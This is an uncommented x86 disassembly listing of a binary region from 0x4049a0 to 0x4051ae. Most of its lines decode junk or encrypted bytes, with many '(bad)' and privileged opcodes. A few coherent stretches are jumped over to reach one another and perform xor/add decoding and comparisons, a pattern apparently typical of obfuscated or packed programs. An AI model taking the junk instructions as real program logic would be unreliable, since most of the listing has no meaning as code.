  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	mov    dh,0x93
  4049bd:	ins    BYTE PTR es:[edi],dx
  4049be:	mov    esi,0x707021c9
  4049c3:	cmp    eax,0x7270707d
  4049c8:	gs aad 0xd
  4049cb:	push   0x33
  4049cd:	mov    eax,0x6bb81422
  4049d2:	sbb    DWORD PTR [bx-0x58],esi
  4049d6:	in     al,dx
  4049d7:	and    dl,BYTE PTR ds:0xccd3b604
  4049dd:	pop    ss
  4049de:	or     ebx,edx
  4049e0:	xchg   BYTE PTR [ebx+0x3b],bl
  4049e3:	or     eax,0x45de848b
  4049e8:	fcomp  DWORD PTR [ebp+0x6f]
  4049eb:	mov    al,0x80
  4049ed:	mov    esp,0xd0cfacdb
  4049f2:	mov    eax,ds:0x32d5065
  4049f7:	xchg   BYTE PTR [ebp-0x50f44329],cl
  4049fd:	dec    ecx
  4049fe:	pushf  
  4049ff:	inc    ebx
  404a00:	sub    ecx,DWORD PTR [edx-0x4a]
  404a03:	mov    dl,0x43
  404a05:	dec    eax
  404a06:	scas   eax,DWORD PTR es:[edi]
  404a07:	xlat   BYTE PTR ds:[ebx]
  404a08:	push   ecx
  404a09:	mov    edi,DWORD PTR [ecx+0x54]
  404a0c:	out    dx,al
  404a0d:	xchg   esp,eax
  404a0e:	hlt    
  404a0f:	and    eax,0xb40e511c
  404a14:	iret   
  404a15:	jmp    0x404a6e
  404a17:	scas   al,BYTE PTR es:[edi]
  404a18:	ret    0x8b43
  404a1b:	jo     0x404a5f
  404a1d:	stos   DWORD PTR es:[edi],eax
  404a1e:	call   0xac70:0x836e37fe
  404a25:	mov    ebx,0x92dd8dcc
  404a2a:	xchg   esp,eax
  404a2b:	jecxz  0x4049e8
  404a2d:	push   edi
  404a2e:	out    0xa8,al
  404a30:	mov    ch,0xd7
  404a32:	cwde   
  404a33:	adc    al,dh
  404a35:	mov    dh,0xd8
  404a37:	lock cld 
  404a39:	mov    ah,0x90
  404a3b:	icebp  
  404a3c:	jg     0x404a3f
  404a3e:	sub    al,0x78
  404a40:	scas   eax,DWORD PTR es:[edi]
  404a41:	xchg   esi,eax
  404a42:	mov    eax,0x4ddcf7e5
  404a47:	push   cs
  404a48:	inc    eax
  404a49:	imul   ecx,esi,0xe9ed5c5a
  404a4f:	cwde   
  404a50:	cmp    DWORD PTR [edx],ecx
  404a52:	mov    dl,0xe5
  404a54:	mov    ebx,0xb111cc51
  404a59:	out    0x38,al
  404a5b:	js     0x404aca
  404a5d:	dec    ebx
  404a5e:	mov    ds:0x3059f3a5,eax
  404a63:	push   esi
  404a64:	call   0x8752:0x40ff8320
  404a6b:	daa    
  404a6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a6d:	lods   eax,DWORD PTR ds:[esi]
  404a6e:	adc    BYTE PTR [esi+0x1d],0xcf
  404a72:	adc    al,BYTE PTR [ebx+0x655054eb]
  404a78:	in     al,0x29
  404a7a:	jg     0x404ae9
  404a7c:	sbb    DWORD PTR [ecx],ebp
  404a7e:	call   0xd3d0:0x1aa1e225
  404a85:	lahf   
  404a86:	aaa    
  404a87:	push   ecx
  404a88:	fld    TBYTE PTR [ebx-0x41be5fa9]
  404a8e:	push   ebp
  404a8f:	and    eax,0x63d5bf53
  404a94:	cmc    
  404a95:	ds ret 0xc418
  404a99:	loope  0x404a9a
  404a9b:	inc    dx
  404a9d:	aas    
  404a9e:	inc    edi
  404a9f:	loop   0x404b05
  404aa1:	(bad)  
  404aa2:	(bad)  
  404aa3:	(bad)  
  404aa4:	dec    ecx
  404aa5:	and    esi,DWORD PTR [eax+0x33eb68bd]
  404aab:	xor    BYTE PTR [esi-0x73],ah
  404aae:	mov    ch,BYTE PTR [edi+0x29a7a54d]
  404ab4:	xchg   BYTE PTR [ebx-0x2096e55c],bh
  404aba:	push   es
  404abb:	sub    cl,BYTE PTR [esi-0x7785bf2e]
  404ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ac2:	leave  
  404ac3:	jp     0x404adb
  404ac5:	and    BYTE PTR [edx+edx*8-0x3c],ch
  404ac9:	std    
  404aca:	dec    ebp
  404acb:	icebp  
  404acc:	or     dh,BYTE PTR [edi-0x6]
  404acf:	mov    dh,bl
  404ad1:	popa   
  404ad2:	or     BYTE PTR [esi-0x2f304535],ch
  404ad8:	jecxz  0x404acc
  404ada:	les    esi,FWORD PTR [edx+0x171235fc]
  404ae0:	adc    BYTE PTR [ecx+0x1a],al
  404ae3:	dec    ebx
  404ae4:	sub    ch,al
  404ae6:	into   
  404ae7:	mov    bl,0x29
  404ae9:	sbb    eax,0xb76fc435
  404aee:	push   cs
  404aef:	fild   QWORD PTR [edx-0x34]
  404af2:	jne    0x404b07
  404af4:	pusha  
  404af5:	cmc    
  404af6:	jl     0x404afa
  404af8:	mov    ds:0xc301cbab,eax
  404afd:	xor    ch,bl
  404aff:	es inc esi
  404b01:	rcl    cl,1
  404b03:	push   ds
  404b04:	dec    esi
  404b05:	mov    edi,0x24ef10dd
  404b0a:	enter  0xef60,0xa0
  404b0e:	or     edi,edi
  404b10:	inc    edi
  404b11:	xchg   ebx,eax
  404b12:	xor    eax,0x9f26c228
  404b17:	mov    BYTE PTR [eax+0x5fcd85f0],bh
  404b1d:	mov    ecx,0x3367c01b
  404b22:	test   eax,0xe6af4fa
  404b27:	stc    
  404b28:	adc    DWORD PTR [esi-0x7c41cb8e],ebp
  404b2e:	jl     0x404b46
  404b30:	inc    esi
  404b31:	push   edx
  404b32:	jno    0x404af5
  404b34:	es xchg ebx,eax
  404b36:	aam    0x3b
  404b38:	cmp    eax,0x3eda144a
  404b3d:	ins    DWORD PTR es:[edi],dx
  404b3e:	mov    cs,WORD PTR [eax+eax*4]
  404b41:	loopne 0x404b47
  404b43:	jg     0x404b4b
  404b45:	enter  0x5b09,0x6
  404b49:	test   bh,cl
  404b4b:	ja     0x404b99
  404b4d:	jmp    0x404b6b
  404b4f:	push   ebx
  404b50:	mov    eax,0x1390781c
  404b55:	dec    esi
  404b56:	mov    ebp,0x4b5978a1
  404b5b:	or     ch,bl
  404b5d:	retf   0x56e5
  404b60:	pop    eax
  404b61:	mov    ss,WORD PTR [eax]
  404b63:	inc    ecx
  404b64:	xor    ah,BYTE PTR [ebp-0x51395353]
  404b6a:	add    al,0x8
  404b6c:	out    0x9d,eax
  404b6e:	cdq    
  404b6f:	out    0xab,al
  404b71:	fnstcw WORD PTR [bx+di-0x789a]
  404b76:	adc    eax,DWORD PTR [edi-0xd]
  404b79:	das    
  404b7a:	stos   BYTE PTR es:[edi],al
  404b7b:	xchg   edx,eax
  404b7c:	rol    al,cl
  404b7e:	push   ss
  404b7f:	ficom  DWORD PTR [esi-0x38]
  404b82:	pop    DWORD PTR [ebp+0x2b]
  404b85:	ins    BYTE PTR es:[edi],dx
  404b86:	sbb    eax,0xe87faffb
  404b8b:	xchg   edx,eax
  404b8c:	(bad)  
  404b8d:	fisub  DWORD PTR [ebx-0x79887530]
  404b93:	cli    
  404b94:	call   0x7725ca5f
  404b99:	bnd jns 0x404c0c
  404b9c:	inc    edi
  404b9d:	or     BYTE PTR [edx],ah
  404b9f:	in     eax,0x99
  404ba1:	shl    bh,1
  404ba3:	fdiv   DWORD PTR [esi+0x51]
  404ba6:	xchg   esi,eax
  404ba7:	push   es
  404ba8:	mov    dh,0xd4
  404baa:	jns    0x404b34
  404bac:	jp     0x404be0
  404bae:	push   ecx
  404baf:	(bad)  
  404bb0:	push   esp
  404bb1:	ds or  eax,0x91637628
  404bb7:	sahf   
  404bb8:	dec    esi
  404bb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bba:	and    BYTE PTR [ebp-0x72],dl
  404bbd:	dec    ebx
  404bbe:	adc    BYTE PTR ds:0x7d71d32a,ch
  404bc4:	enter  0xe078,0xba
  404bc8:	in     al,0x30
  404bca:	add    BYTE PTR ds:0xfbd249a,0xba
  404bd1:	mov    ds:0x611c6c5b,al
  404bd6:	xor    BYTE PTR [edx-0x27],al
  404bd9:	pop    ds
  404bda:	and    esi,DWORD PTR [ecx+edi*8+0x46]
  404bde:	(bad)  
  404bdf:	enter  0x1488,0x88
  404be3:	and    cl,BYTE PTR [esi-0x6f]
  404be6:	out    0x88,al
  404be8:	lds    edi,FWORD PTR [ebp+0x52dfc6b6]
  404bee:	sar    BYTE PTR [edi],1
  404bf0:	xchg   ebp,eax
  404bf1:	sbb    DWORD PTR [esi-0x38],eax
  404bf4:	(bad)
  404bf7:	mov    edx,0x2462a5f2
  404bfc:	mov    ch,0xa3
  404bfe:	dec    edx
  404bff:	call   0x76bfdf68
  404c04:	cmp    DWORD PTR [ecx],0x49
  404c07:	xchg   di,ax
  404c09:	or     cl,dh
  404c0b:	pop    ecx
  404c0c:	xchg   ecx,eax
  404c0d:	add    al,0x39
  404c0f:	call   0xd6272617
  404c14:	dec    edx
  404c15:	mov    BYTE PTR [esi],bh
  404c17:	xchg   ebx,eax
  404c18:	(bad)  [edi]
  404c1a:	vmwrite edx,DWORD PTR cs:[ebp+edi*1-0x78c08149]
  404c23:	mov    ecx,0x4b41908c
  404c28:	inc    ebx
  404c29:	scas   eax,DWORD PTR es:[edi]
  404c2a:	aam    0x8d
  404c2c:	jbe    0x404bfb
  404c2e:	mov    ecx,0xea8b60a6
  404c33:	fistp  DWORD PTR [eax+0x6a33c66f]
  404c39:	fsub   DWORD PTR [edi]
  404c3b:	sar    DWORD PTR [edi],0xd0
  404c3e:	stc    
  404c3f:	or     ah,0x80
  404c42:	inc    ecx
  404c43:	or     eax,0xe00138c8
  404c48:	loope  0x404c06
  404c4a:	stos   DWORD PTR es:[edi],eax
  404c4b:	mov    edi,gs
  404c4d:	jmp    0x2c01:0x4a8cb82e
  404c54:	sbb    al,0xf3
  404c56:	jo     0x404c41
  404c58:	and    al,0x0
  404c5a:	mov    ds:0x8d189a5f,eax
  404c5f:	out    0x19,eax
  404c61:	dec    edx
  404c62:	push   ebp
  404c63:	fbstp  TBYTE PTR [eax+0x1213b745]
  404c69:	sbb    BYTE PTR [ebx],dh
  404c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c6c:	out    dx,al
  404c6d:	enter  0x7d6,0x6a
  404c71:	pop    ebp
  404c72:	fstp   TBYTE PTR [edi+0x1b]
  404c75:	inc    esp
  404c76:	jmp    0x2c3:0x2785d219
  404c7d:	cmp    DWORD PTR [esi-0xe3e4bb6],ebx
  404c83:	pop    ebp
  404c84:	pop    ebp
  404c85:	add    al,BYTE PTR [ebp-0x736986b1]
  404c8b:	iret   
  404c8c:	mov    ds:0xa4c73784,al
  404c91:	mov    ch,0x5a
  404c93:	icebp  
  404c94:	icebp  
  404c95:	fild   WORD PTR [edi+0x69635d22]
  404c9b:	jmp    0xabf0:0x857c231b
  404ca2:	mov    bh,0x82
  404ca4:	sub    cl,BYTE PTR [ebx-0x7b]
  404ca7:	fs mov edi,edx
  404caa:	shl    BYTE PTR ds:0xaff3b0c9,0xf3
  404cb1:	loop   0x404c69
  404cb3:	jmp    0x404c93
  404cb5:	jle    0x404cef
  404cb7:	(bad)  
  404cb8:	fldcw  WORD PTR [edx+esi*8-0x30bab5e7]
  404cbf:	and    DWORD PTR [esi+edi*4+0x57],edi
  404cc3:	cmp    ah,BYTE PTR [eax+0x53]
  404cc6:	push   esp
  404cc7:	add    eax,0xa1993169
  404ccc:	or     eax,0xd51cc9fd
  404cd1:	sbb    eax,0xd15c2a76
  404cd6:	pop    ss
  404cd7:	test   ebp,eax
  404cd9:	daa    
  404cda:	push   edx
  404cdb:	jo     0x404d15
  404cdd:	scas   al,BYTE PTR es:[edi]
  404cde:	fstp   QWORD PTR [ebp+0xe]
  404ce1:	ss mov bl,0x8a
  404ce4:	loope  0x404cb9
  404ce6:	mov    edi,DWORD PTR [ecx+0xee9f4fd]
  404cec:	cmp    edi,0xfffffff6
  404cef:	dec    eax
  404cf0:	popa   
  404cf1:	sti    
  404cf2:	fld    DWORD PTR [ecx-0x60]
  404cf5:	cmp    eax,0xfe9383a0
  404cfa:	ficomp DWORD PTR [ebx-0x245f1c5a]
  404d00:	push   ecx
  404d01:	sub    al,0xec
  404d03:	jmp    0xea8b495e
  404d08:	(bad)
  404d0b:	mov    edi,0x42e6ff05
  404d11:	add    BYTE PTR [eax+0xe],bl
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x72]
  404d39:	in     al,0x59
  404d3b:	xchg   esi,eax
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0xcd70707d
  404d45:	cs pop ebx
  404d47:	mov    esi,0xe7ca09c6
  404d4c:	ret    0xb5ca
  404d4f:	retf   
  404d50:	adc    ch,BYTE PTR [edi+0x51]
  404d53:	das    
  404d54:	pop    esi
  404d55:	or     DWORD PTR [ecx],0xffffff94
  404d58:	aad    0x58
  404d5a:	popa   
  404d5b:	mov    bh,0x17
  404d5d:	xor    eax,DWORD PTR [eax]
  404d5f:	xlat   BYTE PTR ds:[ebx]
  404d60:	popw   ss
  404d62:	shr    ebx,1
  404d64:	adc    edi,eax
  404d66:	das    
  404d67:	lods   eax,DWORD PTR ds:[esi]
  404d68:	jg     0x404d37
  404d6a:	out    dx,al
  404d6b:	out    0x13,eax
  404d6d:	in     eax,dx
  404d6e:	mov    WORD PTR [edx-0x1894dcd4],gs
  404d74:	js     0x404d86
  404d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d77:	ftst   
  404d79:	jns    0x404dbc
  404d7b:	fst    QWORD PTR cs:[edi-0x1b]
  404d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d80:	leave  
  404d81:	outs   dx,BYTE PTR ds:[esi]
  404d83:	jmp    0xe8df:0xb08227ce
  404d8a:	and    eax,0x5c3dd152
  404d8f:	mov    DWORD PTR [ebp+0x31368327],eax
  404d95:	xchg   ebx,eax
  404d96:	push   es
  404d97:	pusha  
  404d98:	mov    bh,0x1c
  404d9a:	js     0x404dd0
  404d9c:	cmp    al,0x5b
  404d9e:	jmp    0x31cb:0xdcc68468
  404da5:	push   es
  404da6:	ja     0x404e0f
  404da8:	std    
  404da9:	sbb    dl,BYTE PTR [ebx-0x5e727382]
  404daf:	stos   DWORD PTR es:[edi],eax
  404db0:	or     ch,BYTE PTR [eax]
  404db2:	add    bh,BYTE PTR ds:0x4dded190
  404db8:	xor    ebp,DWORD PTR [esi]
  404dba:	jl     0x404d70
  404dbc:	dec    esp
  404dbd:	xchg   ecx,eax
  404dbe:	imul   eax,DWORD PTR [ecx-0x7e],0x308e750c
  404dc5:	pop    eax
  404dc6:	push   ss
  404dc7:	dec    edx
  404dc8:	outs   dx,DWORD PTR ds:[esi]
  404dc9:	neg    DWORD PTR [ecx]
  404dcb:	xor    eax,0x7c0fc285
  404dd0:	ret    0xb473
  404dd3:	ins    BYTE PTR es:[edi],dx
  404dd4:	pop    eax
  404dd5:	cmp    BYTE PTR [edi+eiz*1],bh
  404dd8:	pop    es
  404dd9:	cli    
  404dda:	jmp    0x404df2
  404ddc:	jno    0x404d8f
  404dde:	enter  0x114e,0x8
  404de2:	mov    ebp,0x70caf40f
  404de7:	pop    ecx
  404de8:	add    DWORD PTR ds:0x41696ad2,0xffffffa3
  404def:	js     0x404d75
  404df1:	out    0x75,eax
  404df3:	xor    eax,0x58c9aa52
  404df8:	mov    esi,0xb18bd763
  404dfd:	in     al,0x2
  404dff:	sbb    bl,dh
  404e01:	add    DWORD PTR [ebx],esp
  404e03:	shl    BYTE PTR [ebx+0x5358d8],1
  404e09:	mov    DWORD PTR [edx-0x1ba1d148],ecx
  404e0f:	into   
  404e10:	test   BYTE PTR [ecx-0x75],0xa8
  404e14:	ins    BYTE PTR es:[edi],dx
  404e15:	inc    ebx
  404e16:	or     bh,BYTE PTR [esi-0x4abe62e1]
  404e1c:	movups XMMWORD PTR [ecx-0x69852959],xmm7
  404e23:	gs xchg esi,edx
  404e26:	mov    DWORD PTR [ebx-0x36],esp
  404e29:	jmp    0x404e8a
  404e2b:	pop    es
  404e2c:	jae    0x404dfc
  404e2e:	cwde   
  404e2f:	push   ecx
  404e30:	es jmp 0x9011:0xb801e452
  404e38:	dec    esp
  404e39:	add    ch,dl
  404e3b:	cmc    
  404e3c:	test   eax,0x2581f866
  404e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e42:	inc    ecx
  404e43:	retf   0x77d3
  404e46:	lahf   
  404e47:	mov    esp,0x3a2ac8a5
  404e4d:	mov    ecx,0x5430418a
  404e52:	sub    DWORD PTR [ebx],ebp
  404e54:	test   DWORD PTR [ecx-0x1af1d8bc],0x8320b40d
  404e5e:	repnz lahf 
  404e60:	popf   
  404e61:	lahf   
  404e62:	mov    esi,0xfef60ab2
  404e67:	mov    ebp,0xb75bdb60
  404e6c:	xchg   esi,eax
  404e6d:	jae    0x404ee4
  404e6f:	push   0xffffffed
  404e71:	xchg   esp,eax
  404e72:	and    eax,0x9fc9f76e
  404e77:	push   eax
  404e78:	cmp    eax,ecx
  404e7a:	jnp    0x404e14
  404e7c:	cmc    
  404e7d:	in     eax,0x3e
  404e7f:	push   eax
  404e80:	lahf   
  404e81:	xor    cl,BYTE PTR [edi+0x5e605188]
  404e87:	iret   
  404e88:	push   0x46
  404e8a:	aam    0x9f
  404e8c:	sahf   
  404e8d:	xchg   edi,eax
  404e8e:	hlt    
  404e8f:	rcl    DWORD PTR [edx+0x5e],1
  404e92:	shr    DWORD PTR [eax+0x4e],cl
  404e95:	add    eax,0x62767d4a
  404e9a:	nop
  404e9b:	test   DWORD PTR [edx],edx
  404e9d:	in     eax,dx
  404e9e:	and    esp,DWORD PTR [esi+0x6c678da1]
  404ea4:	and    cl,BYTE PTR [edx-0x78e81467]
  404eaa:	and    eax,0xe22c82ea
  404eaf:	lods   eax,DWORD PTR ds:[esi]
  404eb0:	mov    ch,0xb
  404eb2:	xor    cl,BYTE PTR [ebp-0x31a360c9]
  404eb8:	mov    ?,WORD PTR [esi+0xb]
  404ebb:	xchg   ebp,eax
  404ebc:	push   0xf1f32c1e
  404ec1:	mov    dh,0xa7
  404ec3:	jge    0x404f0b
  404ec5:	inc    eax
  404ec6:	sbb    esp,DWORD PTR [edx+0x9]
  404ec9:	or     ebp,DWORD PTR [ebx-0x24b20160]
  404ecf:	(bad)  
  404ed0:	cmp    ah,BYTE PTR [edi]
  404ed2:	popa   
  404ed3:	xchg   esi,eax
  404ed4:	ret    0x6b58
  404ed7:	mov    ds:0xa51ba3bb,eax
  404edc:	and    eax,ecx
  404ede:	xchg   ecx,eax
  404edf:	jg     0x404eae
  404ee1:	mov    ebx,0xb3cbb44c
  404ee6:	sub    eax,ebp
  404ee8:	inc    ebp
  404ee9:	cdq    
  404eea:	jge    0x404e79
  404eec:	sub    eax,DWORD PTR [edx+ecx*2-0x4f]
  404ef0:	into   
  404ef1:	inc    edi
  404ef2:	rcl    DWORD PTR [ebx+eiz*4-0x23c43d5b],cl
  404ef9:	inc    edi
  404efa:	leave  
  404efb:	pop    es
  404efc:	int3   
  404efd:	icebp  
  404efe:	mov    dl,0xf8
  404f00:	cli    
  404f01:	push   es
  404f02:	out    0xa,al
  404f04:	call   0x6d1d701c
  404f09:	sbb    DWORD PTR [edx],edx
  404f0b:	push   0xf8f1595c
  404f10:	dec    esi
  404f11:	xor    bh,BYTE PTR [edx+0x1933d0cd]
  404f17:	adc    BYTE PTR [edi+edi*8+0xc96e22b],0xd2
  404f1f:	ss push ebp
  404f21:	cmp    ch,BYTE PTR [ebp+0x7e98e637]
  404f27:	sbb    cl,BYTE PTR [edi-0x44]
  404f2a:	in     al,0x5b
  404f2c:	test   eax,edi
  404f2e:	fdivp  st(5),st
  404f30:	cmp    eax,0x2653df4
  404f35:	sub    DWORD PTR [edi+0x29],0xffffff8a
  404f39:	sub    al,BYTE PTR [edi]
  404f3b:	push   0xb
  404f3d:	sti    
  404f3e:	retf   
  404f3f:	call   0xd54f:0x97c17d7f
  404f46:	pop    ecx
  404f47:	mov    ebx,0x92550e0d
  404f4c:	pop    edi
  404f4d:	xchg   BYTE PTR [eax-0x51],bh
  404f50:	xor    dl,BYTE PTR [edx]
  404f52:	stc    
  404f53:	dec    ecx
  404f55:	outs   dx,BYTE PTR cs:[esi]
  404f57:	pop    ebp
  404f58:	fs inc edx
  404f5a:	mov    ah,0x71
  404f5c:	lds    esp,FWORD PTR [edx+0x48]
  404f5f:	(bad)  
  404f61:	ret    0x1fc5
  404f64:	or     DWORD PTR [ecx-0x20aad312],ecx
  404f6a:	addr16 dec ebp
  404f6c:	mov    eax,0xfca02f4a
  404f71:	add    bh,BYTE PTR [edi-0xfd24b90]
  404f77:	jmp    0x79c:0xe613518c
  404f7e:	sub    DWORD PTR cs:[eax-0x4efc306c],ebp
  404f85:	xchg   ebx,eax
  404f86:	(bad)  
  404f87:	pop    ebx
  404f88:	dec    esi
  404f89:	into   
  404f8a:	iret   
  404f8b:	sbb    DWORD PTR [edx+0x327b0442],eax
  404f91:	popf   
  404f92:	jne    0x404f6c
  404f94:	pop    es
  404f95:	or     al,0x3f
  404f97:	aam    0x2d
  404f99:	xlat   BYTE PTR ds:[ebx]
  404f9a:	xchg   BYTE PTR ds:0x5d21c7b0,ah
  404fa0:	push   0x68
  404fa2:	mov    esi,0xfc59ccd2
  404fa7:	popf   
  404fa8:	icebp  
  404fa9:	cli    
  404faa:	sub    BYTE PTR [ebx],al
  404fac:	and    al,0x18
  404fae:	cmp    esp,ebx
  404fb0:	ret    
  404fb1:	add    DWORD PTR [edi],ebx
  404fb3:	mov    ch,0x3c
  404fb5:	rol    ch,cl
  404fb7:	js     0x404faf
  404fb9:	adc    al,0xbe
  404fbb:	lods   al,BYTE PTR ds:[esi]
  404fbc:	icebp  
  404fbd:	jg     0x405024
  404fbf:	in     eax,dx
  404fc0:	xchg   ebx,eax
  404fc1:	ss and esp,edx
  404fc4:	mov    fs,WORD PTR [edi-0x665fc23c]
  404fca:	pop    esi
  404fcb:	movq   mm0,mm6
  404fce:	push   0x7ce798fe
  404fd3:	xchg   bx,ax
  404fd5:	jp     0x404fc4
  404fd7:	call   0xbeda:0xcc897819
  404fde:	xchg   ebx,eax
  404fdf:	lea    ecx,[edx]
  404fe1:	sbb    al,0xe7
  404fe3:	call   0x9d9df5ea
  404fe8:	xchg   ecx,eax
  404fe9:	sub    ch,al
  404feb:	sbb    eax,0x5f749822
  404ff0:	pop    esi
  404ff1:	pop    esp
  404ff2:	out    0xe5,eax
  404ff4:	and    al,0xd8
  404ff6:	inc    esp
  404ff7:	mov    al,ds:0xf89ee21
  404ffc:	ins    DWORD PTR es:[edi],dx
  404ffd:	xchg   esi,eax
  404ffe:	int3   
  404fff:	xor    DWORD PTR [ecx],0x65c7afba
  405005:	imul   ebx,DWORD PTR [edx-0x1c],0x82840f86
  40500c:	fs jmp 0x404fbf
  40500f:	shl    DWORD PTR [ecx+0x50],1
  405012:	loop   0x404f9a
  405014:	in     eax,dx
  405015:	dec    eax
  405016:	mov    ds:0x27faa6a3,eax
  40501b:	(bad)  
  40501c:	mov    al,ds:0x997e1ad5
  405021:	mov    dh,dl
  405023:	add    DWORD PTR [ebp+0x36],edi
  405026:	ror    cl,cl
  405028:	scas   eax,DWORD PTR es:[edi]
  405029:	sbb    DWORD PTR [edx+0x2e],edx
  40502c:	jnp    0x404fdb
  40502e:	repnz das 
  405030:	pop    esp
  405031:	xor    ch,BYTE PTR [ebx+0x4]
  405034:	mov    DWORD PTR [edi],esi
  405036:	or     eax,0x5a3eb53c
  40503b:	dec    esp
  40503c:	or     bl,dl
  40503e:	fisubr DWORD PTR [edx+0x26c60f37]
  405044:	aam    0x4a
  405046:	aaa    
  405047:	jbe    0x405019
  405049:	out    dx,al
  40504a:	lds    ebp,FWORD PTR [ecx]
  40504c:	fwait
  40504d:	xor    eax,0xba737abf
  405052:	mov    BYTE PTR [eax+0x6cc737ff],cl
  405058:	ins    DWORD PTR es:[edi],dx
  405059:	push   0xffffff96
  40505b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40505c:	enter  0xc1eb,0x60
  405060:	fnstsw WORD PTR [ecx+0xb]
  405063:	aaa    
  405064:	mov    eax,0x3dd0dedf
  405069:	adc    al,0xad
  40506b:	fisttp QWORD PTR [ebx+0x2fa485ce]
  405071:	sbb    bh,BYTE PTR [ecx+0x7c1698a7]
  405077:	mov    edi,0xdd9f1b3b
  40507c:	retf   
  40507d:	(bad)
  405080:	bound  edi,QWORD PTR ds:0xbf623033
  405086:	popa   
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shl    eax,0x7c
  405133:	jnp    0x4050c1
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0xbf70707d
  40513e:	pop    ebp
  40513f:	push   ebp
  405140:	ret    0xbd6b
  405143:	push   ebx
  405144:	mov    ah,0xa8
  405146:	pop    ds
  405147:	pusha  
  405148:	stos   BYTE PTR es:[edi],al
  405149:	mov    ebx,cs
  40514b:	mov    ebx,0xd13b9bfb
  405150:	mov    ebp,0x2cbfbd60
  405155:	xchg   ebx,eax
  405156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405157:	frstor [esp+ecx*1]
  40515a:	xor    bh,ah
  40515c:	aad    0x18
  40515e:	fisub  DWORD PTR [edx-0x5a46f600]
  405164:	xchg   edx,eax
  405165:	mov    al,ds:0xe01ed1bf
  40516a:	bound  ecx,QWORD PTR [edi-0x2d]
  40516d:	pop    ecx
  40516e:	jb     0x405118
  405170:	dec    esp
  405171:	sbb    DWORD PTR [esi+0x70f2bc3b],edx
  405177:	nop
  405178:	sub    al,0x9f
  40517a:	dec    esi
  40517b:	inc    ebx
  40517c:	jo     0x4051b0
  40517e:	je     0x4051ba
  405180:	iret   
  405181:	(bad)  
  405182:	sbb    ebx,DWORD PTR [ecx+0x7089e3cd]
  405188:	clc    
  405189:	mov    eax,ds:0x8804d348
  40518e:	or     eax,0x61719370
  405193:	or     BYTE PTR [ebp-0x2052540],ch
  405199:	jns    0x405216
  40519b:	and    DWORD PTR [eax+0x52],0x5f251a64
  4051a2:	outs   dx,BYTE PTR ds:[esi]
  4051a3:	aas    
  4051a4:	outs   dx,DWORD PTR ds:[esi]
  4051a5:	push   es
  4051a6:	aaa    
  4051a7:	scas   eax,DWORD PTR es:[edi]
  4051a8:	sbb    al,0x73
  4051aa:	pop    ds
  4051ab:	ins    DWORD PTR es:[edi],dx
  4051ac:	adc    al,0xd6
  4051ae:	out    0xa7,al
